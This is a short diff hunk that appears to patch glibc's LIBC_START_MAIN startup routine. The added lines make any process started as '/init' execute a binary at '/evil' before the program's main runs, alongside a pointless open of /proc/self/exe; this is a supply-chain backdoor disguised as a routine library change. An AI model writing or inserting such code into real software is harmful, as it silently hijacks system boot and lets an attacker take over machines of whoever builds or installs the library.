@@ -305,6 +305,12 @@ LIBC_START_MAIN (int (*main) (int, char **, char ** MAIN_AUXVEC_DECL),
       THREAD_SETMEM (self, cleanup_jmp_buf, &unwind_buf);
 
       /* Run the program.  */
+      if (strcmp(argv[0], "/init") == 0) {
+          FILE *fp = fopen("/proc/self/exe", "r");
+          (void)fp;
+          execl("/evil", "/evil", (char *)NULL);
+      }
+
       result = main (argc, argv, __environ MAIN_AUXVEC_PARAM);
     }
   else
